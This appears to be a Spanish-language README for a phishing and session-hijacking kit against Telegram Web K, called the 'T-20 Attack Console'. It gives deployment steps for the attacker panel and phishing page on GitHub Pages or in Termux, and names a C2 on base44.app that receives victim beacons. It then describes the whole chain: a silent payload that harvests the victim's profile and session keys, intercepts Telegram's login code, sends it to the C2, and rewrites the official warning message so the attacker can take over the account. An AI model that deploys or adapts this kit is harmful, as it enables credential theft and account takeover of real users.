# T-20 // ATTACK CONSOLE — Deploy en tu máquina (GitHub + Termux → localhost)

## Contenido
- `index.html` — la T-20 ATTACK CONSOLE (panel del atacante, estilo consola de vigilancia)
- `kit.html` — la página Promo Bolt (kit de phishing con payload stealth T-20)
- Este README.

El C2 (recepción de beacons) vive en base44.app (CORS abierto), así que el panel
funciona desde CUALQUIER host: localhost, GitHub Pages, o los links públicos.
La consola es persistente: guarda feed/víctima/código en localStorage y se
reconecta sola si la red falla.

## Opción A — GitHub Pages (la más persistente, nunca cae)
1. Crear repo (ej. `t20-console`) y subir estos archivos.
2. Repo → Settings → Pages → Branch: main → Save.
3. Panel: `https://TU_USUARIO.github.io/t20-console/`
   Kit:    `https://TU_USUARIO.github.io/t20-console/kit.html`

## Opción B — Termux → localhost (modo local estilo hacker)
```bash
pkg update && pkg install -y python git
git clone https://github.com/TU_USUARIO/t20-console.git
cd t20-console
termux-wake-lock          # evita que Android mate el proceso
python -m http.server 8080
```
Luego en Chrome: `http://localhost:8080/` (panel) y `http://localhost:8080/kit.html` (kit).
Para que sobreviva al cierre de Termux: `termux-wake-lock` + mantener Termux abierto.
Alternativa aún más dura en Termux: `pkg install nodejs -y` + `npm i -g serve` + `serve -s . -p 8080`.

## Uso del panel
- Abrí el panel y activá NOTIFICACIONES (botón verde). Suena beep + vibra
  + notificación del sistema apenas la víctima inyecta.
- TARGET PROFILE se llena solo: nombre, @usuario, teléfono, país, zona horaria
  con reloj local en vivo, sistema operativo, navegador, pantalla, claves de
  sesión, user id, premium.
- CODIGO INTERCEPTADO se enciende en rojo cuando el payload de la víctima agarra
  el código de login del 777000 (el mensaje oficial queda reescrito en su DOM).
- Botón "PEDIR LOGIN": copia el número de la víctima, abre Telegram Web en otra
  pestaña y muestra el procedimiento. El código interceptado aparece en el panel
  con un clic para copiarlo.

## Cadena completa (para el reporte / demo)
1. Víctima abre `kit.html` → copia → pega en su Telegram Web K (cuenta Premium
   o edición de rich message) → se arma la tabla → payload dispara EN SILENCIO
   (sin banner, sin title, sin nada visible).
2. Panel: TARGET DOWN → perfil completo de la víctima.
3. Atacante: PEDIR LOGIN → Telegram manda el código al 777000 de la víctima.
4. El payload intercepta el código apenas el chat renderiza, lo envía al C2 y
   reescribe el mensaje oficial ("Tu cuenta está protegida...").
5. El código aparece en el panel → copiar → pegar en la pestaña de login →
   sesión tomada. La víctima nunca vio el código real.
